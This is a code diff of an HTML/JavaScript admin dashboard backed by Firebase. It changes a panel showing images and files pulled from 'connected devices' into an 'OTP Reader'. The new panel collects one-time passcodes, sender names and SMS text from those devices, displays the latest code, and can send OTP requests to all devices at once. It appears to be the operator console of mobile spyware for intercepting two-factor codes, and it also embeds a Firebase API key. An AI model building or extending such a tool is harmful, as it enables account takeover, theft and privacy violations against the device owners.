@@ -3,12 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Admin - Firebase Media</title>
+    <title>📱 OTP Reader - Admin</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
     <style>
         *{margin:0;padding:0;box-sizing:border-box;font-family:'Inter',sans-serif}
         body{background:#0a0a0a;color:#00ff41;min-height:100vh;padding:20px;font-family:'Courier New',monospace}
-        .container{max-width:1400px;margin:0 auto}
+        .container{max-width:1200px;margin:0 auto}
         .header{display:flex;justify-content:space-between;align-items:center;padding:16px 20px;background:#0d0d0d;border-radius:12px;border:1px solid #00ff4133;margin-bottom:20px;flex-wrap:wrap;gap:10px}
         .header h1{font-size:22px;color:#00ff41}
         .header .status{display:flex;align-items:center;gap:10px;font-size:13px;color:#00ff4188;flex-wrap:wrap}
@@ -21,22 +21,27 @@
         .card{background:#0d0d0d;border-radius:12px;padding:16px;margin-bottom:16px;border:1px solid #00ff4122}
         .card h3{font-size:14px;color:#00ff41;margin-bottom:10px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:8px}
         .card h3 span{color:#00ff4188;font-size:11px;font-weight:400}
-        .grid-2{display:grid;grid-template-columns:1fr 1fr;gap:16px}
-        .item{display:flex;justify-content:space-between;padding:4px 0;border-bottom:1px solid #00ff4111;font-size:12px}
-        .item .label{color:#00ff4188}
-        .item .value{color:#00ff41}
-        .preview-img{max-width:200px;max-height:200px;border-radius:8px;border:1px solid #00ff4133;margin:8px 0}
         .stats-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:12px;margin-bottom:20px}
         .stat-card{background:#0d0d0d;padding:14px 18px;border-radius:10px;border:1px solid #00ff4122}
         .stat-card .num{font-size:24px;font-weight:800;color:#00ff41}
         .stat-card .label{font-size:11px;color:#00ff4188}
+        .otp-display{background:#001a00;padding:30px;border-radius:12px;border:2px solid #00ff41;text-align:center;margin:12px 0}
+        .otp-display .otp{font-size:48px;font-weight:800;color:#00ff41;letter-spacing:6px;font-family:'Courier New',monospace}
+        .otp-display .label{font-size:12px;color:#00ff4188;margin-top:4px}
+        .item{display:flex;justify-content:space-between;padding:4px 0;border-bottom:1px solid #00ff4111;font-size:12px}
+        .item .label{color:#00ff4188}
+        .item .value{color:#00ff41}
         .logs{background:#000a00;padding:10px;border-radius:8px;border:1px solid #00ff4122;max-height:150px;overflow-y:auto;font-size:11px;color:#00ff4188;margin-top:10px}
         .logs .log-entry{color:#00ff41;padding:2px 0}
-        .file-list{max-height:200px;overflow-y:auto}
         .firebase-badge{font-size:10px;color:#00ff4188;border:1px solid #00ff4122;padding:4px 12px;border-radius:20px;display:inline-block}
         .online{color:#00ff41}
         .offline{color:#ff4444}
-        @media(max-width:768px){.grid-2{grid-template-columns:1fr}}
+        .device-list{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:12px}
+        .device-card{background:#0d0d0d;border-radius:12px;padding:14px;border:1px solid #00ff4122}
+        .device-card .device-id{font-size:13px;color:#00ff41;font-weight:700}
+        .device-card .otp{font-size:20px;color:#00ff41;font-weight:800;letter-spacing:2px;margin:6px 0}
+        .device-card .time{font-size:10px;color:#00ff4188}
+        @media(max-width:768px){.device-list{grid-template-columns:1fr}}
     </style>
 </head>
 <body>
@@ -45,9 +50,9 @@
 
     <div class="header">
         <div>
-            <h1>📸 ADMIN - FIREBASE</h1>
+            <h1>📱 OTP READER</h1>
             <div style="font-size:11px;color:#00ff4188;">
-                <span class="firebase-badge">🔥 Firebase Realtime</span>
+                <span class="firebase-badge">🔥 Live OTP Forwarding</span>
                 <span id="firebaseStatus" class="offline" style="margin-left:8px;">● Connecting...</span>
             </div>
         </div>
@@ -56,22 +61,32 @@
             <span id="liveStatus">Live</span>
             <span style="color:#00ff4188;margin-left:10px;font-size:11px;" id="lastUpdate">Updated: Just now</span>
             <button class="btn" onclick="loadData()">🔄 Refresh</button>
-            <button class="btn btn-danger" onclick="clearFirebase()">🗑️ Clear</button>
+            <button class="btn btn-success" onclick="requestOTP()">📩 Request OTP</button>
+            <button class="btn btn-danger" onclick="clearAll()">🗑️ Clear</button>
+        </div>
+    </div>
+
+    <!-- Latest OTP -->
+    <div class="card" style="border-color:#00ff4166;">
+        <h3>🔑 Latest OTP</h3>
+        <div class="otp-display">
+            <div class="otp" id="latestOtp">-----</div>
+            <div class="label" id="otpSource">Waiting for OTP...</div>
         </div>
     </div>
 
     <div class="stats-grid">
         <div class="stat-card"><div class="num" id="totalDevices">0</div><div class="label">📱 Devices</div></div>
-        <div class="stat-card"><div class="num" id="totalImages">0</div><div class="label">🖼️ Images</div></div>
-        <div class="stat-card"><div class="num" id="totalFiles">0</div><div class="label">📁 Files</div></div>
+        <div class="stat-card"><div class="num" id="totalOtps">0</div><div class="label">🔑 OTPs Received</div></div>
     </div>
 
-    <div id="mediaContainer">
-        <div style="color:#00ff4188;text-align:center;padding:40px;font-size:13px;">⏳ Loading from Firebase...</div>
+    <h3 style="font-size:14px;color:#00ff41;margin-bottom:12px;">📱 Connected Devices</h3>
+    <div class="device-list" id="deviceList">
+        <div style="color:#00ff4188;text-align:center;padding:20px;font-size:13px;">⏳ No devices connected</div>
     </div>
 
     <div class="logs" id="logs">
-        <div class="log-entry">[System] Firebase dashboard ready</div>
+        <div class="log-entry">[System] OTP Reader ready</div>
     </div>
 
 </div>
@@ -82,7 +97,7 @@
 
 <script>
 // ==========================================
-// 🔥 FIREBASE CONFIG - APNI CONFIG DAALO 🔥
+// 🔥 FIREBASE CONFIG
 // ==========================================
 const firebaseConfig = {
     apiKey: "AIzaSyCq5-Rrk6dh0SzqKcR8zR8zFHeGUgTj960",
@@ -94,11 +109,11 @@ const firebaseConfig = {
     measurementId: "G-3K3WD2EP7M"
 };
 
-// Initialize Firebase
 firebase.initializeApp(firebaseConfig);
 const database = firebase.database();
 
-let mediaData = {};
+let otpData = {};
+let latestOtp = null;
 
 // ==========================================
 // FIREBASE STATUS
@@ -121,118 +136,158 @@ database.ref('.info/connected').on('value', (snap) => {
 });
 
 // ==========================================
-// LOAD DATA FROM FIREBASE
+// LOAD DATA
 // ==========================================
 function loadData() {
-    addLog('📊 Loading data from Firebase...');
+    addLog('📊 Loading data...');
     
-    database.ref('media').once('value')
+    database.ref('otps').once('value')
         .then(snapshot => {
             const data = snapshot.val();
             if (data) {
-                mediaData = data;
-                renderMedia();
+                otpData = data;
+                renderDevices();
                 updateStats();
-                addLog('✅ Loaded: ' + Object.keys(mediaData).length + ' devices');
+                addLog('✅ Loaded: ' + Object.keys(otpData).length + ' devices');
                 document.getElementById('lastUpdate').textContent = 'Updated: ' + new Date().toLocaleTimeString();
             } else {
-                mediaData = {};
-                document.getElementById('mediaContainer').innerHTML = '<div style="color:#00ff4188;text-align:center;padding:40px;font-size:13px;">⏳ No data in Firebase. Connect a device.</div>';
+                otpData = {};
+                document.getElementById('deviceList').innerHTML = '<div style="color:#00ff4188;text-align:center;padding:20px;font-size:13px;">⏳ No devices connected</div>';
                 addLog('⚠️ No data found');
             }
         })
-        .catch(err => {
-            addLog('❌ Firebase error: ' + err.message);
-        });
-}
-
-// ==========================================
-// CLEAR FIREBASE
-// ==========================================
-function clearFirebase() {
-    if (!confirm('Delete all Firebase data?')) return;
-    database.ref('media').remove()
-        .then(() => {
-            mediaData = {};
-            renderMedia();
-            updateStats();
-            addLog('🗑️ Firebase data cleared');
-            toast('🗑️ Data cleared!');
-        })
-        .catch(err => addLog('❌ Clear error: ' + err.message));
-}
-
-// ==========================================
-// RENDER MEDIA
-// ==========================================
-function renderMedia() {
-    const container = document.getElementById('mediaContainer');
-    const deviceIds = Object.keys(mediaData);
-
-    if (deviceIds.length === 0) {
-        container.innerHTML = '<div style="color:#00ff4188;text-align:center;padding:40px;font-size:13px;">⏳ No devices connected</div>';
-        return;
-    }
-
-    let html = '';
-    deviceIds.forEach(id => {
-        const d = mediaData[id];
-        const lastUpdate = d.timestamp ? new Date(d.timestamp).toLocaleTimeString() : 'Never';
-        const isOnline = d.timestamp && (Date.now() - new Date(d.timestamp).getTime() < 60000);
-
-        html += `
-            <div class="card">
-                <h3>📱 ${id} <span style="font-size:11px;color:${isOnline ? '#00ff41' : '#ff4444'};">${isOnline ? '🟢 Online' : '🔴 Offline'} • ${lastUpdate}</span></h3>
-                ${d.image ? `<div><img src="${d.image}" class="preview-img"></div>` : ''}
-                ${d.files && d.files.length > 0 ? `
-                    <div style="margin-top:8px;">
-                        <div style="font-size:12px;color:#00ff4188;">📁 ${d.files.length} files</div>
-                        <div class="file-list">
-                            ${d.files.slice(0, 10).map(f => `
-                                <div class="item"><span class="label">${f.name}</span><span class="value">${Math.round(f.size/1024)} KB</span></div>
-                            `).join('')}
-                            ${d.files.length > 10 ? `<div style="color:#00ff4188;font-size:11px;">+ ${d.files.length - 10} more</div>` : ''}
-                        </div>
-                    </div>
-                ` : ''}
-                <div style="font-size:11px;color:#00ff4188;margin-top:6px;">📱 ${d.platform || 'Unknown'}</div>
-            </div>
-        `;
-    });
-
-    container.innerHTML = html;
-    document.getElementById('totalDevices').textContent = deviceIds.length;
-}
-
-// ==========================================
-// UPDATE STATS
-// ==========================================
-function updateStats() {
-    const deviceIds = Object.keys(mediaData);
-    let totalImages = 0, totalFiles = 0;
-    deviceIds.forEach(id => {
-        const d = mediaData[id];
-        if (d.image) totalImages++;
-        if (d.files) totalFiles += d.files.length;
-    });
-    document.getElementById('totalImages').textContent = totalImages;
-    document.getElementById('totalFiles').textContent = totalFiles;
+        .catch(err => addLog('❌ Firebase error: ' + err.message));
 }
 
 // ==========================================
 // REAL-TIME LISTENER
 // ==========================================
 function startRealtimeListener() {
-    database.ref('media').on('value', snapshot => {
+    database.ref('otps').on('value', snapshot => {
         const data = snapshot.val();
         if (data) {
-            mediaData = data;
-            renderMedia();
+            otpData = data;
+            renderDevices();
             updateStats();
+            updateLatestOTP();
             document.getElementById('lastUpdate').textContent = 'Updated: ' + new Date().toLocaleTimeString();
-            addLog('🔄 Real-time update: ' + Object.keys(mediaData).length + ' devices');
+            addLog('🔄 Real-time update: ' + Object.keys(otpData).length + ' devices');
         }
     });
+}
+
+// ==========================================
+// RENDER DEVICES
+// ==========================================
+function renderDevices() {
+    const container = document.getElementById('deviceList');
+    const deviceIds = Object.keys(otpData);
+
+    if (deviceIds.length === 0) {
+        container.innerHTML = '<div style="color:#00ff4188;text-align:center;padding:20px;font-size:13px;">⏳ No devices connected</div>';
+        return;
+    }
+
+    container.innerHTML = deviceIds.map(id => {
+        const d = otpData[id];
+        const otp = d.otp || '-----';
+        const time = d.timestamp ? new Date(d.timestamp).toLocaleTimeString() : 'Never';
+        const from = d.from || 'Unknown';
+        
+        return `
+            <div class="device-card">
+                <div class="device-id">📱 ${id}</div>
+                <div class="otp">🔑 ${otp}</div>
+                <div class="time">📩 ${from} • ${time}</div>
+                <div style="font-size:9px;color:#00ff4188;margin-top:4px;word-break:break-all;">${d.message || ''}</div>
+            </div>
+        `;
+    }).join('');
+}
+
+// ==========================================
+// UPDATE LATEST OTP
+// ==========================================
+function updateLatestOTP() {
+    const deviceIds = Object.keys(otpData);
+    let latest = null;
+    let latestTime = 0;
+
+    deviceIds.forEach(id => {
+        const d = otpData[id];
+        if (d.timestamp) {
+            const time = new Date(d.timestamp).getTime();
+            if (time > latestTime) {
+                latestTime = time;
+                latest = d;
+            }
+        }
+    });
+
+    if (latest && latest.otp) {
+        latestOtp = latest.otp;
+        document.getElementById('latestOtp').textContent = latest.otp;
+        document.getElementById('otpSource').textContent = '📩 From: ' + (latest.from || 'Unknown') + ' | ' + new Date(latestTime).toLocaleTimeString();
+    }
+}
+
+// ==========================================
+// UPDATE STATS
+// ==========================================
+function updateStats() {
+    const deviceIds = Object.keys(otpData);
+    let totalOtps = 0;
+    deviceIds.forEach(id => {
+        if (otpData[id].otp) totalOtps++;
+    });
+    document.getElementById('totalDevices').textContent = deviceIds.length;
+    document.getElementById('totalOtps').textContent = totalOtps;
+}
+
+// ==========================================
+// REQUEST OTP
+// ==========================================
+function requestOTP() {
+    addLog('📩 Requesting OTP from devices...');
+    
+    // Send request to all devices
+    const deviceIds = Object.keys(otpData);
+    if (deviceIds.length === 0) {
+        addLog('⚠️ No devices connected');
+        toast('⚠️ No devices connected');
+        return;
+    }
+
+    deviceIds.forEach(id => {
+        database.ref('requests/' + id).set({
+            request: 'otp',
+            timestamp: new Date().toISOString()
+        }).then(() => {
+            addLog('📩 OTP requested from: ' + id);
+        }).catch(err => {
+            addLog('❌ Request error: ' + err.message);
+        });
+    });
+
+    toast('📩 OTP requested from all devices');
+}
+
+// ==========================================
+// CLEAR ALL
+// ==========================================
+function clearAll() {
+    if (!confirm('Delete all OTP data?')) return;
+    database.ref('otps').remove()
+        .then(() => {
+            otpData = {};
+            renderDevices();
+            updateStats();
+            document.getElementById('latestOtp').textContent = '-----';
+            document.getElementById('otpSource').textContent = 'Waiting for OTP...';
+            addLog('🗑️ All data cleared');
+            toast('🗑️ Data cleared!');
+        })
+        .catch(err => addLog('❌ Clear error: ' + err.message));
 }
 
 // ==========================================
@@ -269,16 +324,17 @@ function toast(msg) {
 // EXPOSE FUNCTIONS
 // ==========================================
 window.loadData = loadData;
-window.clearFirebase = clearFirebase;
+window.requestOTP = requestOTP;
+window.clearAll = clearAll;
 
 // ==========================================
 // INIT
 // ==========================================
 loadData();
 startRealtimeListener();
-addLog('🟢 Firebase dashboard ready');
-console.log('📸 Admin - Firebase Loaded');
-console.log('🔥 Firebase DB:', firebaseConfig.databaseURL);
+addLog('🟢 OTP Reader ready');
+console.log('📱 OTP Reader Loaded');
+console.log('🔥 Firebase:', firebaseConfig.databaseURL);
 </script>
 </body>
 </html>
